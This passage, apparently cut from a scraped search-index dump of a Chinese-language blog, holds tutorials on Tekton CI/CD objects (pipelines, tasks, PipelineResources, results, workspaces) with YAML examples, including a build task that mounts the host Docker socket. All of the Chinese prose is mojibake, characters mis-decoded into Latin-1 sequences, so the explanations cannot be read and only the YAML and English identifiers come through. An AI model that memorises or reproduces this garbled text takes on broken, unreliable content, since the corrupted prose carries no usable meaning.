åœ¨pipelineä¸­ä¸ä»…å¯ä»¥ç›´æ¥ç»™taskæä¾›å‚æ•°(è§ä¸‹é¢çš„tasksä»‹ç»)ï¼Œè¿˜å¯ä»¥é€šè¿‡å£°æ˜çš„æ–¹å¼å‘pipelinerunæ¥ç´¢è¦,ç„¶ååœ¨tasksä¸­ç»™å®ƒä»¬èµ‹å€¼,æ³¨æ„paramséœ€è¦ä½¿ç”¨å˜é‡æ›¿æ¢çš„æ–¹å¼ï¼Œworkspaceå’Œresourceå¯ä»¥ç›´æ¥ä½¿ç”¨å£°æ˜çš„åç§°ã€‚ä¾‹å­å¦‚ä¸‹: spec: resources: - name: code # éœ€è¦prç»™æˆ‘ä»¬ä¼ ä¸€ä¸ªgitç±»å‹çš„èµ„æº type: git workspaces: - name: dockerconfig # éœ€è¦prç»™æˆ‘ä»¬ä¼ ä¸€ä¸ªå·¥ä½œç©ºé—´(å¯é€‰) optional: true params: - name: image # éœ€è¦prç»™æˆ‘ä»¬ä¼ ä¸€ä¸ªimageå‚æ•° tasks: - name: build-the-image taskRef: name: build-push workspaces: - name: dockerconfig # å¼•ç”¨ä¸Šé¢å£°æ˜çš„dockerconfig workspaceï¼Œä¼ é€’ç»™taskä¸­çš„dockerconfig workspace workspace: dockerconfig params: - name: pathToDockerFile value: Dockerfile - name: pathToContext value: /workspace/examples/microservices/leeroy-web - name: image value: $(params.image) # å¼•ç”¨ä¸Šé¢å£°æ˜çš„imageå‚æ•°ï¼Œä¼ é€’ç»™taskä¸­çš„imageå‚æ•° resources: inputs: - name: my-repo # å¼•ç”¨ä¸Šé¢å£°æ˜çš„code resourceï¼Œä¼ é€’taskä¸­inputç±»å‹çš„my-repo resource resource: code å…ˆå£°æ˜åœ¨å¼•ç”¨ ","date":"2021-08-22 21:21","objectID":"/post/2632/:3:1","tags":["k8s","devops","tekton"],"title":"tektonå­¦ä¹ -pipelineèµ„æºå¯¹è±¡(ä¸‰) ","uri":"/post/2632/"},{"categories":["kubernetes","devops"],"content":"tasks tasksç”¨äºæŒ‡å®šå½“å‰pipelineä¸­åŒ…å«å“ªäº›task,ä»¥åŠä¸€äº›è¿è¡Œè§„åˆ™ç­‰ç­‰ã€‚ 1.paramsã€resourcesã€workspaces æä¾›taskéœ€è¦çš„è¿è¡Œå‚æ•°ã€èµ„æºã€‚å¯ä»¥åƒä¸‹é¢è¿™æ ·é…ç½® spec: tasks: - name: build-the-image taskRef: name: build-push params: - name: pathToDockerFile value: Dockerfile - name: pathToContext value: /workspace/examples/microservices/leeroy-web resources: inputs: - name: workspace resource: my-repo outputs: - name: image resource: my-image 2.from å¦‚æœpipelineä¸­çš„taskéœ€è¦ä½¿ç”¨å‰ä¸€ä¸ªtaskçš„è¾“å‡ºä½œä¸ºè¾“å…¥,fromä¹Ÿå¯ä»¥è¾¾åˆ°æ§åˆ¶taskæ‰§è¡Œé¡ºåºçš„æ•ˆæœ - name: build-app taskRef: name: build-push resources: outputs: - name: image resource: my-image - name: deploy-app taskRef: name: deploy-kubectl resources: inputs: - name: image resource: my-image from: - build-app éƒ¨ç½²taskéœ€è¦åœ¨æ„å»ºé•œåƒtaskä¹‹åæ‰§è¡Œã€‚å¯ä»¥çœ‹åˆ°ç»™éƒ¨ç½²taskæä¾›inputèµ„æºï¼Œæ˜¯ä»æ„å»ºé•œåƒtaskçš„è¾“å‡ºä¸­è·å–çš„ã€‚ fromæ˜¯ä¸ªæ•°ç»„ç±»å‹,å¯ä»¥æŒ‡å®šå¤šä¸ªtaskæ¥æ§åˆ¶é¡ºåºï¼Œä½†resourceè·å–çš„æ˜¯æœ€åä¸€ä¸ªtaskçš„ã€‚(æˆ‘çš„çŒœæµ‹) 3.runAfter è¡¨ç¤ºå½“å‰ä»»åŠ¡åœ¨æŸä»»åŠ¡æ‰§è¡Œåå¼€å§‹æ‰§è¡Œï¼Œä¹Ÿæ˜¯ç”¨äºæ§åˆ¶taskçš„æ‰§è¡Œé¡ºåºçš„ã€‚ - name: test-app taskRef: name: make-test - name: build-app taskRef: name: kaniko-build runAfter: - test-app build-appåœ¨test-appä¹‹åæ‰§è¡Œ 4.retries æŒ‡å®šæŸä¸ªtaskåœ¨æ‰§è¡Œå¤±è´¥åé‡è¯•çš„æ¬¡æ•° tasks: - name: build-the-image retries: 1 taskRef: name: build-push 4.When whenè¡¨è¾¾å¼å¯ä»¥ç”¨æ¥åˆ¤æ–­taskæ˜¯å¦è¦æ‰§è¡Œã€‚ whenä¸­å¯ä»¥ä½¿ç”¨ Input: æ˜¯whenè¡¨è¾¾å¼çš„è¾“å…¥ï¼Œå®ƒå¯ä»¥æ˜¯é™æ€å†…å®¹æˆ–å˜é‡ï¼ˆparamsæˆ–resultsï¼‰ã€‚å¦‚æœæœªæä¾›è¾“å…¥ï¼Œåˆ™é»˜è®¤ä¸ºç©ºå­—ç¬¦ä¸²ã€‚ Operator: è¿ç®—ç¬¦ã€‚å¯ç”¨inå’Œnotin Values: ä¸€ä¸ªå­—ç¬¦ä¸²å€¼æ•°ç»„,å¿…é¡»æä¾›æ•°ç»„å€¼ï¼Œå¹¶ä¸”è¯¥æ•°ç»„ä¸èƒ½ä¸ºç©ºã€‚å®ƒå¯ä»¥ä½¿ç”¨é™æ€å†…å®¹æˆ–å˜é‡ï¼ˆparamsã€resultsæˆ–å·¥ä½œåŒºçš„ç»‘å®šçŠ¶æ€ï¼‰ ä¸‹é¢æ˜¯ç¤ºä¾‹: tasks: - name: first-create-file when: # å½“å‚æ•°pathçš„å€¼æ˜¯README.mdæ‰ä¼šè¿è¡Œè¿™ä¸ªtask - input: \"$(params.path)\" operator: in values: [\"README.md\"] taskRef: name: first-create-file --- tasks: - name: echo-file-exists when: # å½“check-fileä»»åŠ¡çš„ç»“æœä¸­existsçš„å€¼æ˜¯yesï¼Œæ‰ä¼šè¿è¡Œè¿™ä¸ªtask - input: \"$(tasks.check-file.results.exists)\" operator: in values: [\"yes\"] taskRef: name: echo-file-exists --- tasks: - name: run-lint when: # å¦‚æœpipelinerunæä¾›äº†lint-config workspaceåˆ™ä¼šè¿è¡Œè¿™ä¸ªtask - input: \"$(workspaces.lint-config.bound)\" # å·¥ä½œåŒºæ˜¯å¦ç»‘å®šï¼Œå°±æ˜¯pipelinerunæ˜¯å¦æä¾›äº†workspaceå·ã€‚ operator: in values: [\"true\"] taskRef: name: lint-source å¯ä»¥å®šä¹‰ä¸€äº›ç”¨äºæ£€æŸ¥çš„task,å°†ç»“æœç»™result,å†é€šè¿‡resultæ¥å†³å®šæ˜¯å¦è¦è¿è¡Œå½“å‰task ","date":"2021-08-22 21:21","objectID":"/post/2632/:3:2","tags":["k8s","devops","tekton"],"title":"tektonå­¦ä¹ -pipelineèµ„æºå¯¹è±¡(ä¸‰) ","uri":"/post/2632/"},{"categories":["kubernetes","devops"],"content":"resources pipelineéœ€è¦ç”¨pipelineresourceä¸ºç»„æˆå®ƒçš„taskæä¾›è¾“å…¥å’Œè¾“å‡º spec: resources: - name: my-repo type: git - name: my-image type: image ","date":"2021-08-22 21:21","objectID":"/post/2632/:3:3","tags":["k8s","devops","tekton"],"title":"tektonå­¦ä¹ -pipelineèµ„æºå¯¹è±¡(ä¸‰) ","uri":"/post/2632/"},{"categories":["kubernetes","devops"],"content":"results æœ‰ä¸¤ç§ç”¨æ³•,åœ¨ä½¿ç”¨ 1.åœ¨pipelineä¸­çš„taskå¯ä»¥è°ƒç”¨å¦å¤–ä¸€ä¸ªtaskçš„resultï¼Œä½¿ç”¨æ–¹æ³•$(tasks.\u003ctask-name\u003e.results.\u003cresult-name\u003e)ã€‚ç”±äºå­˜åœ¨è¿™ç§è°ƒç”¨å…³ç³»ï¼Œå°±éœ€è¦æœ‰å…ˆåæ‰§è¡Œé¡ºåºï¼Œåœ¨ä½¿ç”¨äº†resultå¼•ç”¨åï¼Œtektonä¼šç¡®ä¿è¢«å¼•ç”¨çš„taskå…ˆæ‰§è¡Œã€‚ ä¾‹å¦‚ï¼š åœ¨ä¸‹é¢çš„é…ç½®ä¸­,ä»checkout-sourceè¿™ä¸ªtaskä¸­è·å–commitç»“æœã€‚ Tekton å°†ç¡®ä¿ checkout-source ä»»åŠ¡åœ¨buildä»»åŠ¡ä¹‹å‰è¿è¡Œã€‚ tasks: - name: build taskRef: name: build params: - name: foo value: \"$(tasks.checkout-source.results.commit)\" æ³¨æ„: å¦‚æœcheckout-sourceæ²¡æœ‰å°†ç»“æœå†™å…¥resultï¼Œé‚£ä¹ˆbuildè¿™ä¸ªtaskå°±æ‰¾ä¸åˆ°commitè¿™ä¸ªç»“æœäº†,æœ€ç»ˆPipelineå¤±è´¥å¹¶æ˜¾ç¤º InvalidTaskResultReference: unable to find result referenced by param 'foo' in 'task';: Could not find result with name 'commit' for task run 'checkout-source' 2. å°†taskçš„resultä½œä¸ºpipelineçš„resultï¼Œä¹Ÿå¯ä»¥ç»„åˆå¤šä¸ªresultä½œä¸ºpipelineçš„resultã€‚æœ€ç»ˆçš„ç»“æœå¯ä»¥åœ¨pipelinerunçš„status.pipelineResultså­—æ®µçœ‹åˆ° ä¾‹å¦‚: ç¬¬ä¸€ä¸ªsumè¡¨ç¤ºå°†task calculate-sumçš„outputValueç»“æœï¼Œä½œä¸ºpipelinerunçš„result ç¬¬äºŒä¸ªall-sumè¡¨ç¤ºå°†ä¸¤ä¸ªç»“æœç»„åˆåœ¨ä¸€èµ·,æ³¨æ„ä¸æ˜¯ç›¸å‡æ˜¯å­—ç¬¦ä¸²çš„ç»„åˆã€‚ spec: results: - name: sum description: the sum of all three operands value: $(tasks.calculate-sum.results.outputValue) - name: all-sum value: $(tasks.second-add.results.sum)-$(tasks.first-add.results.sum) ","date":"2021-08-22 21:21","objectID":"/post/2632/:3:4","tags":["k8s","devops","tekton"],"title":"tektonå­¦ä¹ -pipelineèµ„æºå¯¹è±¡(ä¸‰) ","uri":"/post/2632/"},{"categories":["kubernetes","devops"],"content":"finally æŒ‡å®šè¦åœ¨æ‰€æœ‰taskæ‰§è¡Œå®Œæˆåéœ€è¦å¹¶è¡Œæ‰§è¡Œçš„ä¸€ä¸ªæˆ–å¤šä¸ªä»»åŠ¡ã€‚ finally taskä¸taskéå¸¸ç›¸ä¼¼ï¼Œå¹¶éµå¾ªç›¸åŒçš„è¯­æ³•ã€‚ æ³¨æ„ç‚¹: finally taskä¼šå½±å“pipelinerunçš„è¿è¡ŒçŠ¶æ€ã€‚ åœ¨finallyçš„taskä¸­ä¸èƒ½ä½¿ç”¨from ä¸èƒ½æ§åˆ¶æ‰§è¡Œé¡ºåº ä¸èƒ½ä½¿ç”¨æ¡ä»¶è¯­å¥ æš‚æ—¶ä¸æ”¯æŒä»taskä¸­è·å–resultï¼Œå³ä¸èƒ½ä½¿ç”¨$(tasks.checkout-source.results.commit) ","date":"2021-08-22 21:21","objectID":"/post/2632/:3:5","tags":["k8s","devops","tekton"],"title":"tektonå­¦ä¹ -pipelineèµ„æºå¯¹è±¡(ä¸‰) ","uri":"/post/2632/"},{"categories":["kubernetes","devops"],"content":"æ¦‚è¿° PipelineResourcesæ˜¯ç»™Taskæä¾›è¾“å…¥å’Œè¾“å‡ºçš„èµ„æºå¯¹è±¡ã€‚ ä¸€ä¸ªTaskå¯èƒ½ä¼šæœ‰å¤šä¸ªè¾“å…¥å’Œè¾“å‡º: Taskçš„è¾“å…¥å¯ä»¥æ˜¯GitHubä»£ç ä»“åº“ Taskçš„è¾“å‡ºå¯ä»¥æ˜¯ä¸€ä¸ªè¦ä¸Šä¼ åˆ°é•œåƒä»“åº“çš„å®¹å™¨é•œåƒ Taskçš„è¾“å‡ºå¯ä»¥æ˜¯ä¸€ä¸ªè¦ä¸Šä¼ åˆ°å­˜å‚¨æ¡¶çš„jaråŒ… PipelineResourcesä¸€ç›´å¤„äºalphaç‰ˆæœ¬,éšæ—¶å¯èƒ½ä¼šè¢«æŠ›å¼ƒ,å®˜æ–¹ä¹Ÿç»™äº†ä¸€äº›æ›¿ä»£å®ƒçš„æ–¹æ¡ˆ,åœ¨è¿™é‡Œ ä¸ºä»€ä¹ˆå¯èƒ½ä¼šè¢«æŠ›å¼ƒï¼Ÿ ","date":"2021-08-21 23:23","objectID":"/post/2628/:1:0","tags":["k8s","devops","tekton"],"title":"tektonå­¦ä¹ -PipelineResourceså¯¹è±¡(ä¸€)","uri":"/post/2628/"},{"categories":["kubernetes","devops"],"content":"ä¸€ã€PipelineResourceså¯¹è±¡æ”¯æŒçš„å±æ€§ å¿…é¡»: apiVersion - tekton.dev/v1alpha1. kind - PipelineResource metadata - ç•¥ spec - PipelineResourceå¯¹è±¡çš„è¯¦ç»†é…ç½® type - PipelineResourceçš„ç±»å‹,å¯é€‰gitã€pullRequestã€imageã€clusterã€storageã€cloudEvent å¯é€‰: description - èµ„æºæè¿° params - åœ¨é€‰æ‹©ä¸åŒçš„èµ„æºç±»å‹æ—¶,åœ¨è¿™é‡ŒæŒ‡å®šå…¶å‚æ•°åç§°å’Œå€¼ã€‚æ¯”å¦‚gitéœ€è¦åä¸ºurlå’Œrevisionå‚æ•° secrets - å½“å‚æ•°ä¸­çš„å€¼éœ€è¦è„±æ•æ—¶,å¯ä»¥ä½¿ç”¨secretä»£æ›¿paramsã€‚é…ç½®ç¤ºä¾‹ ","date":"2021-08-21 23:23","objectID":"/post/2628/:2:0","tags":["k8s","devops","tekton"],"title":"tektonå­¦ä¹ -PipelineResourceså¯¹è±¡(ä¸€)","uri":"/post/2628/"},{"categories":["kubernetes","devops"],"content":"äºŒã€é…ç½®ç¤ºä¾‹ ","date":"2021-08-21 23:23","objectID":"/post/2628/:3:0","tags":["k8s","devops","tekton"],"title":"tektonå­¦ä¹ -PipelineResourceså¯¹è±¡(ä¸€)","uri":"/post/2628/"},{"categories":["kubernetes","devops"],"content":"1.é…ç½®gitèµ„æº apiVersion: tekton.dev/v1alpha1 kind: PipelineResource metadata: name: website-git spec: type: git params: - name: url value: https://github.com/tektoncd/website - name: revision value: main å®šä¹‰äº†gitä»“åº“åœ°å€å’Œgitåˆ†æ”¯ ","date":"2021-08-21 23:23","objectID":"/post/2628/:3:1","tags":["k8s","devops","tekton"],"title":"tektonå­¦ä¹ -PipelineResourceså¯¹è±¡(ä¸€)","uri":"/post/2628/"},{"categories":["kubernetes","devops"],"content":"2.é…ç½®å®¹å™¨é•œåƒèµ„æº apiVersion: tekton.dev/v1alpha1 kind: PipelineResource metadata: name: website-image spec: type: image params: - name: url value: cr.io/website å®šä¹‰é•œåƒä»“åº“åœ°å€,tagä¸å†™ä»£è¡¨latest ","date":"2021-08-21 23:23","objectID":"/post/2628/:3:2","tags":["k8s","devops","tekton"],"title":"tektonå­¦ä¹ -PipelineResourceså¯¹è±¡(ä¸€)","uri":"/post/2628/"},{"categories":["kubernetes","devops"],"content":"æ¦‚è¿° TaskåŒ…å«ä¸€ç³»åˆ—stepï¼Œæ¯ä¸ªstepå°±æ˜¯ä¸€ä¸ªå®¹å™¨ï¼Œè¿™äº›stepä¼šæŒ‰ç…§å®šä¹‰çš„é¡ºåºæ‰§è¡Œ,å½“ä¸€ä¸ªstepæ‰§è¡Œå¤±è´¥åï¼Œåç»­çš„å®¹å™¨ä¸ä¼šæ‰§è¡Œã€‚Taskåœ¨Kubernetesé›†ç¾¤ä¸Šä½œä¸ºPodæ‰§è¡Œã€‚Taskåœ¨ç‰¹å®šçš„å‘½åç©ºé—´ä¸­å¯ç”¨ï¼Œè€ŒClusterTaskåœ¨æ•´ä¸ªé›†ç¾¤ä¸­å¯ç”¨ã€‚ ","date":"2021-08-19 22:21","objectID":"/post/2627/:1:0","tags":["devops","tekton"],"title":"tektonå­¦ä¹ -taskèµ„æºå¯¹è±¡(äºŒ)","uri":"/post/2627/"},{"categories":["kubernetes","devops"],"content":"ä¸€ã€taskå¯¹è±¡æ”¯æŒçš„å±æ€§ https://tekton.dev/vault/pipelines-v0.18.1/tasks/#configuring-a-task å¿…é¡»: apiVersion - apiç‰ˆæœ¬,ä¾‹å¦‚: tekton.dev/v1beta1. kind - å®šä¹‰çš„èµ„æºç±»å‹,è¿™é‡Œæ˜¯Task metadata - å…ƒæ•°æ®,åŒ…æ‹¬nameã€lablesã€annotationsç­‰ spec - å®šä¹‰Taskèµ„æºå¯¹è±¡çš„è¯¦ç»†é…ç½®ä¿¡æ¯ã€‚ steps - å®šä¹‰æ‰§è¡Œå…·ä½“æ“ä½œçš„å®¹å™¨ä¿¡æ¯ å¯é€‰: description - taskçš„æè¿°ä¿¡æ¯ params - å®šä¹‰taskçš„æ‰§è¡Œå‚æ•°ï¼Œä¾‹å¦‚ç¼–è¯‘å‚æ•°æˆ–åˆ¶å“åç§°ã€‚å‚æ•°å¯ä»¥åœ¨taskä¸­è®¾ç½®é»˜è®¤å€¼ä¹Ÿå¯ä»¥é€šè¿‡TaskRunä¼ é€’ï¼Œé€šè¿‡$(params.xxx)å¯ä»¥ä½¿ç”¨å‚æ•°å€¼ resources - å®šä¹‰taskéœ€è¦çš„èµ„æº(PipelineResources) inputs - å®šä¹‰éœ€è¦çš„è¾“å…¥èµ„æºï¼Œä¾‹å¦‚æºä»£ç ã€‚éœ€è¦taskrunæä¾› outputs - å®šä¹‰éœ€è¦çš„è¾“å‡ºèµ„æºï¼Œä¾‹å¦‚å®¹å™¨é•œåƒã€‚éœ€è¦taskrunæä¾› workspaces - å®šä¹‰ä¸€ä¸ªworkspaceå·,åœ¨è¿è¡Œtaskæ—¶å¿…é¡»è¦æä¾›ä¸€ä¸ªworkspaceå·,æˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ªå·è¿›è¡ŒæŒä¹…åŒ–,è¿™ä¸ªå·æ˜¯é’ˆå¯¹taskä¸­çš„æ‰€æœ‰å®¹å™¨çš„ã€‚å¦‚æœä¸æŒ‡å®šmountPath,åˆ™é»˜è®¤æŒ‚è½½åˆ°/workspace/ ä¸­ results - è¿™ä¸ªå¯ä»¥ç”¨äºstepè¿è¡Œç»“æœçš„ä¼ é€’ã€‚å…·ä½“è¯·çœ‹ä¸‹é¢çš„resultsæµ‹è¯• volumes - å®šä¹‰å·ï¼Œæˆ‘ç†è§£å®ƒå’ŒPodçš„volumesä¸€æ ·ã€‚volumeså’Œworkspacesä¸åŒçš„æ˜¯å¯ä»¥é€‰æ‹©ä¸åŒçš„å®¹å™¨è¿›è¡ŒæŒ‚è½½ã€‚å¯ä»¥é€šè¿‡steps[0].volumeMount.xxæ¥é…ç½®ã€‚ stepTemplate - å®šä¹‰taskä¸­æ‰€æœ‰step(å®¹å™¨)å…±æœ‰çš„å±æ€§,è¿™æ ·æ¯ä¸ªstepå¯ä»¥ç›´æ¥ç»§æ‰¿å±æ€§ï¼Œè€Œä¸ç”¨åœ¨æ¯ä¸ªå®¹å™¨ä¸­éƒ½å†™ä¸€é sidecars - sidecarså¯ä»¥å®šä¹‰å®¹å™¨ï¼Œè¿™äº›å®¹å™¨ä¼šåœ¨stepå®šä¹‰çš„å®¹å™¨ä¹‹å‰è¿è¡Œ,æœ‰Probeçš„æƒ…å†µä¸‹ï¼Œä¼šé˜»å¡stepå®¹å™¨çš„å¯åŠ¨ ","date":"2021-08-19 22:21","objectID":"/post/2627/:2:0","tags":["devops","tekton"],"title":"tektonå­¦ä¹ -taskèµ„æºå¯¹è±¡(äºŒ)","uri":"/post/2627/"},{"categories":["kubernetes","devops"],"content":"äºŒã€å°æŠ€å·§ ","date":"2021-08-19 22:21","objectID":"/post/2627/:3:0","tags":["devops","tekton"],"title":"tektonå­¦ä¹ -taskèµ„æºå¯¹è±¡(äºŒ)","uri":"/post/2627/"},{"categories":["kubernetes","devops"],"content":"1.script stepä¸­æœ‰ä¸ªscriptå­—æ®µ,å†…å®¹ä½œä¸ºè„šæœ¬è¿è¡Œï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡argsä¼ å‚ã€‚ä¾‹å¦‚ï¼š ... spec: steps: - name: one image: curlimages/curl:7.77.0 script: | #!/bin/sh echo \"Hello $1!\" args: - \"soulchild\" ","date":"2021-08-19 22:21","objectID":"/post/2627/:3:1","tags":["devops","tekton"],"title":"tektonå­¦ä¹ -taskèµ„æºå¯¹è±¡(äºŒ)","uri":"/post/2627/"},{"categories":["kubernetes","devops"],"content":"2.apiæ–‡æ¡£ æˆ‘åœ¨å†™yamlçš„æ—¶å€™å–œæ¬¢å¯¹ç…§apiæ–‡æ¡£æ¥å†™ï¼Œä½†æ˜¯tektonçš„å®˜ç½‘æ²¡æ‰¾åˆ°apiæ–‡æ¡£ã€‚æœ€åæ‰¾åˆ°ä¸€ä¸ªæŠ˜ä¸­çš„åŠæ³•ã€‚åœ¨tektonçš„gitä»“åº“å‘ç°äº†swagger.jsonï¼Œç„¶ååˆ©ç”¨swagger-uiè¯»å–ï¼Œä¹Ÿå¯ä»¥å‘ˆç°å‡ºapiæ–‡æ¡£ã€‚ é¦–å…ˆæ‰“å¼€swagger-demo: https://petstore.swagger.io/ ç„¶åå°†åé¢è¿™ä¸ªåœ°å€æ”¾è¿›å»è¯»å–å°±å¯ä»¥äº†https://raw.githubusercontent.com/tektoncd/pipeline/main/pkg/apis/pipeline/v1beta1/swagger.json ","date":"2021-08-19 22:21","objectID":"/post/2627/:3:2","tags":["devops","tekton"],"title":"tektonå­¦ä¹ -taskèµ„æºå¯¹è±¡(äºŒ)","uri":"/post/2627/"},{"categories":["kubernetes","devops"],"content":"ä¸‰ã€ä¸€äº›å±æ€§æµ‹è¯• ","date":"2021-08-19 22:21","objectID":"/post/2627/:4:0","tags":["devops","tekton"],"title":"tektonå­¦ä¹ -taskèµ„æºå¯¹è±¡(äºŒ)","uri":"/post/2627/"},{"categories":["kubernetes","devops"],"content":"3.1 workspace apiVersion: tekton.dev/v1beta1 kind: Task metadata: name: workspace-test spec: steps: - name: wsp-test1 image: busybox:stable script: | #!/bin/sh ls -ld $(workspaces.wsp-test.path) ls $(workspaces.wsp-test.path) echo 'Hello World' \u003e $(workspaces.wsp-test.path)/content.txt ls $(workspaces.wsp-test.path) cat $(workspaces.wsp-test.path)/content.txt - name: wsp-test2 image: busybox:stable script: | #!/bin/sh ls -ld $(workspaces.wsp-test.path) ls $(workspaces.wsp-test.path) echo 'Hello World' \u003e $(workspaces.wsp-test.path)/content.txt ls $(workspaces.wsp-test.path) cat $(workspaces.wsp-test.path)/content.txt workspaces: - name: wsp-test description: \"æµ‹è¯•workspace\" mountPath: /wp-test/a/b/c ä½¿ç”¨workspaceså®šä¹‰äº†ä¸€ä¸ªå·¥ä½œç©ºé—´,è¡¨ç¤ºè¦è¿è¡Œè¿™ä¸ªtaskå¿…é¡»è¦æä¾›ä¸€ä¸ªworkspaceï¼Œä¸‹é¢å®šä¹‰ä¸€ä¸ªtaskrun apiVersion: tekton.dev/v1beta1 kind: TaskRun metadata: name: workspace-test spec: taskRef: name: workspace-test workspaces: - name: wsp-test volumeClaimTemplate: spec: storageClassName: managed-nfs-storage accessModes: - ReadWriteOnce resources: requests: storage: 1Gi åœ¨è¿™é‡Œæä¾›äº†workspaceæ˜¯ä¸€ä¸ªpvcæ¨¡æ¿,ä¹Ÿæ”¯æŒå…¶ä»–çš„ç±»å‹,å¦‚: persistentVolumeClaimã€emptyDirã€configMapã€secretã€ ä¸Šé¢çš„ä¾‹å­ä¸­çš„æ‰§è¡Œç»“æœ,å¯ä»¥çœ‹åˆ°ä¸¤ä¸ªstepçš„/wp-test/a/b/cæ˜¯åŒä¸€ä¸ªç›®å½•,éœ€è¦æ³¨æ„çš„æ˜¯ä½¿ç”¨volumeClaimTemplateæ¯æ¬¡éƒ½ä¼šé‡æ–°åˆ›å»ºpvc,pvä¹Ÿä¼šç›¸åº”çš„è¢«é‡æ–°åˆ›å»ºã€‚ 80770-r414xrzn63s.png ","date":"2021-08-19 22:21","objectID":"/post/2627/:4:1","tags":["devops","tekton"],"title":"tektonå­¦ä¹ -taskèµ„æºå¯¹è±¡(äºŒ)","uri":"/post/2627/"},{"categories":["kubernetes","devops"],"content":"3.2 stepTemplate apiVersion: tekton.dev/v1beta1 kind: Task metadata: name: hello namespace: default spec: steps: - args: - soulchild image: curlimages/curl:7.77.0 name: one script: | #!/bin/sh date +%s echo \"Hello $1! $myname\" - command: - /bin/sh - -c - \"echo Hello World! $myname \u0026\u0026 date +%s\" image: curlimages/curl:7.77.0 name: hello - command: - /bin/sh - -c - \"echo my name is $myname \u0026\u0026 date +%s\" image: curlimages/curl:7.77.0 name: soulchild stepTemplate: env: - name: myname value: soulchild è¿™ä¸ªtaskä¸­æ‰€æœ‰çš„stepéƒ½ä¼šåŒ…å«mynameè¿™ä¸ªå˜é‡ ","date":"2021-08-19 22:21","objectID":"/post/2627/:4:2","tags":["devops","tekton"],"title":"tektonå­¦ä¹ -taskèµ„æºå¯¹è±¡(äºŒ)","uri":"/post/2627/"},{"categories":["kubernetes","devops"],"content":"3.3 resutls è¿™é‡Œå‚è€ƒcatalog hubä¸­çš„ä¸€ä¸ªä¾‹å­ apiVersion: tekton.dev/v1beta1 kind: Task metadata: name: generate-build-id spec: params: - name: base-version description: Base product version type: string default: \"1.0\" results: - name: timestamp description: Current timestamp - name: build-id description: ID of the current build steps: - name: get-timestamp image: docker.io/library/bash:5.0.18@sha256:8ef3f8518f47caf1ddcbdf49e983a9a119f9faeb41c2468dd20ff39cd242d69d #tag: 5.0.18 script: | #!/usr/bin/env bash ts=`date \"+%Y%m%d-%H%M%S\"` echo \"Current Timestamp: ${ts}\" echo ${ts} | tr -d \"\\n\" | tee $(results.timestamp.path) - name: get-buildid image: docker.io/library/bash:5.0.18@sha256:8ef3f8518f47caf1ddcbdf49e983a9a119f9faeb41c2468dd20ff39cd242d69d #tag: 5.0.18 script: | #!/usr/bin/env bash ts=`cat $(results.timestamp.path)` buildId=$(inputs.params.base-version)-${ts} echo ${buildId} | tr -d \"\\n\" | tee $(results.build-id.path) è¿™ä¸ªtaskä¼šè¿è¡Œä¸¤ä¸ªstep,é¦–å…ˆè¿è¡Œget-timestampï¼Œå¹¶å°†ç»“æœå†™å…¥åˆ°æ–‡ä»¶ä¸­ï¼Œè·¯å¾„æ˜¯$(results.timestamp.path),è¿™ä¸ªå˜é‡çš„æœ€ç»ˆç»“æœå…¶å®å°±æ˜¯ä¸€ä¸ªæ–‡ä»¶è·¯å¾„/tekton/results/timestamp,ç¬¬äºŒä¸ªæ­¥éª¤ä¹Ÿå¯ä»¥é€šè¿‡ç›¸åŒçš„è·¯å¾„è®¿é—®è¿™ä¸ªæ–‡ä»¶,è¿™æ ·å°±å®ç°äº†ç»“æœçš„ä¼ é€’ã€‚åœ¨pipelineä¸­å¯ä»¥é€šè¿‡tasks.\u003ctaskName\u003e.results.\u003cresultName\u003eæ¥è°ƒç”¨ä¸åŒtaskçš„ç»“æœ,è¿™å°±æ˜¯å®ƒçš„ä½œç”¨äº†ã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡æŸ¥çœ‹TaskRunçš„çŠ¶æ€æ¥è·å–è¿è¡Œç»“æœã€‚ä¸‹é¢åˆ›å»ºTaskRunè¯•è¯•çœ‹ã€‚ TaskRun apiVersion: tekton.dev/v1beta1 kind: TaskRun metadata: generateName: build-id- spec: taskRef: name: generate-build-id params: - name: base-version value: v1.0 è¿è¡Œåé€šè¿‡å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹ç»“æœ k get taskrun build-id-m9q4t -o jsonpath={.status.taskResults} | jq . 92353-e6wemti92tt.png ","date":"2021-08-19 22:21","objectID":"/post/2627/:4:3","tags":["devops","tekton"],"title":"tektonå­¦ä¹ -taskèµ„æºå¯¹è±¡(äºŒ)","uri":"/post/2627/"},{"categories":["kubernetes","devops"],"content":"å››ã€ç¤ºä¾‹ https://hub.tekton.dev è¿™é‡Œå¯ä»¥çœ‹åˆ°å¾ˆå¤šå¯ä»¥å¤ç”¨çš„tektonèµ„æº ","date":"2021-08-19 22:21","objectID":"/post/2627/:5:0","tags":["devops","tekton"],"title":"tektonå­¦ä¹ -taskèµ„æºå¯¹è±¡(äºŒ)","uri":"/post/2627/"},{"categories":["kubernetes","devops"],"content":"1.doodæ–¹å¼æ„å»ºé•œåƒ apiVersion: tekton.dev/v1beta1 kind: Task metadata: name: docker-build-push spec: params: - name: dockerfileName type: string description: dockerfileæ–‡ä»¶å,ä½œä¸ºdocker build -fçš„å‚æ•° default: Dockerfile # æŒ‡å®šéœ€è¦ä¸€ä¸ªgitè¾“å…¥èµ„æºã€ä¸€ä¸ªimageè¾“å‡ºèµ„æº,åœ¨è¿™ä¸ªtaskè¿è¡Œæ—¶å¿…è¦è¦æä¾› resources: inputs: - name: code type: git outputs: - name: builtImage type: image steps: - name: docker-build image: docker:stable workingDir: \"/workspace/$(resources.inputs.code.name)\" args: [ \"build\", \"--no-cache\", \"--tag\", \"$(resources.outputs.builtImage.url)\", \"--file\", \"$(params.dockerfileName)\", \".\", ] volumeMounts: - name: docker-socket mountPath: /var/run/docker.sock - name: docker-push image: docker:stable args: [\"push\", \"$(resources.outputs.builtImage.url)\"] volumeMounts: - name: docker-socket mountPath: /var/run/docker.sock # å®šä¹‰ä¸€ä¸ªå·ï¼Œç”¨äºæŒ‚è½½ä¸»æœºçš„docker socketæ–‡ä»¶ volumes: - name: docker-socket hostPath: path: /var/run/docker.sock type: Socket ä¸Šé¢å¯ä»¥æ 